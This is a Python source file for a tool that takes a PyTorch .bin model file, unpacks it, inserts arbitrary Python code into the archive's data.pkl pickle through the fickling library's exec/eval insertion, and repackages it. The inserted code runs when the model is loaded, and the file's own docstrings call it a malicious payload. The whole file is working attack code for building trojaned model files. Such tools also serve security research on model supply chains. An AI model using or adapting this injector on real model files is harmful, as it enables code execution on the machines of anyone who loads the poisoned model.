import os
import shutil
import tempfile
import zipfile

from fickling.fickle import Pickled


class PyTorchPayloadInjector:
    """
    A class to inject arbitrary Python code into PyTorch .bin model files.
    """

    def __init__(self, bin_path):
        """
        Initialize the injector with the path to the original .bin file.

        Args:
            bin_path (str): Path to the PyTorch .bin file to modify
        """
        self.bin_path = bin_path
        self.temp_dir = None
        self.extracted_pkl_path = None
        self.filename = bin_path.split("/")[-1].split(".")[0]

    def _extract_bin(self):
        """Extract the ZIP contents of the .bin file to a temporary directory."""
        self.temp_dir = tempfile.mkdtemp()

        with zipfile.ZipFile(self.bin_path, "r") as zip_ref:
            members = zip_ref.namelist()
            zip_ref.extractall(self.temp_dir)

        # Find the first file that ends with 'data.pkl'
        match = next((name for name in members if name.endswith("data.pkl")), None)

        if not match:
            raise FileNotFoundError(
                f"Could not find a file ending with 'data.pkl' in archive {self.bin_path}"
            )

        # Build the absolute path to the extracted pickle
        self.extracted_pkl_path = os.path.join(self.temp_dir, match)
        print(f"Extracted pickle path: {self.extracted_pkl_path}")

    def _inject_payload(self,
                        *args,
                        module,
                        attr,
                        run_first: bool = True, ):

        """Inject the malicious payload into the pickle file using fickling."""
        with open(self.extracted_pkl_path, "rb") as f:
            pickled_data = Pickled.load(f)

        # Insert the Python code to be executed when unpickled
        pickled_data.insert_python(*args, module=module, attr=attr, run_first=run_first)

        with open(self.extracted_pkl_path, "wb") as f:
            pickled_data.dump(f)

    def _repackage_bin(self, output_path):
        """Repackage the modified contents back into a .bin file."""
        with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    full_path = os.path.join(root, file)
                    rel_path = os.path.relpath(full_path, self.temp_dir)
                    zipf.write(full_path, rel_path)

    def _cleanup_temp_files(self):
        """Clean up temporary files and directory."""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
                print(f"✓ Cleaned up temporary directory: {self.temp_dir}")
            except Exception as e:
                print(
                    f"⚠ Warning: Could not clean up temporary directory {self.temp_dir}: {e}"
                )

    def insert_exec(self, payload_code, output_path):
        self.insert_python(payload_code, module="builtins", attr="exec", output_path=output_path)

    def insert_python(
            self,
            *args,
            module: str = "builtins",
            attr: str = "eval",
            run_first: bool = True,
            output_path: str = "injected_model",
    ):
        try:
            print(f"Extracting {self.bin_path}...")
            self._extract_bin()

            print("Injecting payload...")
            self._inject_payload(*args, module=module, attr=attr, run_first=run_first)

            print(f"Repackaging to {output_path}...")
            self._repackage_bin(output_path)

            print("✓ Payload injection completed successfully!")

        except Exception as e:
            print(f"✗ Error during injection: {e}")
            raise
        finally:
            # Always clean up temporary files, even if an error occurs
            self._cleanup_temp_files()
